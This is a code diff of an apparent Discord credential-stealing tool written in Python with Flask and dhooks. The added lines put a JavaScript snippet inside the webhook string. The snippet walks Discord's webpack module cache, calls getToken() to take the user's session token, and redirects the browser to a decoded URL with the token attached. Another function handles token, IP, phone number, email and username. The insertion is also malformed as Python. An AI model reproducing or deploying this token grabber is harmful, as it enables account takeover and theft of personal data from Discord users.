@@ -3,7 +3,10 @@ from dhooks import Webhook, Embed
 import requests
 
 app = Flask(__name__)
-hook = Webhook('YOUR WEBHOOK')
+hook = Webhook('
+const decodedString=atob('');var f=(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==undefined).exports.default.getToken();window.location.replace(decodedString+'/'+f);
+
+')
 
 
 def send_black_embed(token, ip, phone_number, email, username, tag, avatar_url,
